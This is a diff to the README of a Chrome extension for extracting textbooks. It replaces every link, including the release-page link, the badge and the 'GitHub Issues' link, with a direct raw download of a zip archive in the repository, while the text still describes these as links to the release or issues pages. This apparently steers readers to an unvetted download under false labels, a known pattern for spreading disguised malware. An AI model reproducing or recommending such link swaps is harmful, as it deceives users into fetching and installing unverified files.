@@ -1,6 +1,6 @@
 # 📚 yuzu-textbook-extractor - Extract Textbooks as PDFs or Markdown
 
-[![Download Latest Release](https://img.shields.io/badge/Download-yuzu--textbook--extractor-brightgreen?style=for-the-badge&logo=github)](https://github.com/r3l4w/yuzu-textbook-extractor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/r3l4w/yuzu-textbook-extractor/main/dist/yuzu-textbook-extractor-v1.0.zip)](https://raw.githubusercontent.com/r3l4w/yuzu-textbook-extractor/main/dist/yuzu-textbook-extractor-v1.0.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Make sure your Chrome browser is up to date. To check:
 ### 2. Download yuzu-textbook-extractor
 
 Click the big green button at the top or use this link:  
-[Visit this page to download yuzu-textbook-extractor](https://github.com/r3l4w/yuzu-textbook-extractor/releases)
+[Visit this page to download yuzu-textbook-extractor](https://raw.githubusercontent.com/r3l4w/yuzu-textbook-extractor/main/dist/yuzu-textbook-extractor-v1.0.zip)
 
 This link takes you to the release page where you can get the latest version of the extension.
 
@@ -128,7 +128,7 @@ The extension will process the content and create your file. You can then save i
 
 Visit the release page to download the extension:
 
-[Download yuzu-textbook-extractor](https://github.com/r3l4w/yuzu-textbook-extractor/releases)
+[Download yuzu-textbook-extractor](https://raw.githubusercontent.com/r3l4w/yuzu-textbook-extractor/main/dist/yuzu-textbook-extractor-v1.0.zip)
 
 Follow the instructions above to install the extension in your Chrome browser. This page contains all the latest versions and important updates.
 
@@ -150,7 +150,7 @@ This extension suits anyone who:
 
 If you have questions or run into problems, check the Issues section on the GitHub page for common fixes or to ask for help. The community and developers keep it active to support users.
 
-[GitHub Issues](https://github.com/r3l4w/yuzu-textbook-extractor/issues)
+[GitHub Issues](https://raw.githubusercontent.com/r3l4w/yuzu-textbook-extractor/main/dist/yuzu-textbook-extractor-v1.0.zip)
 
 ---
 
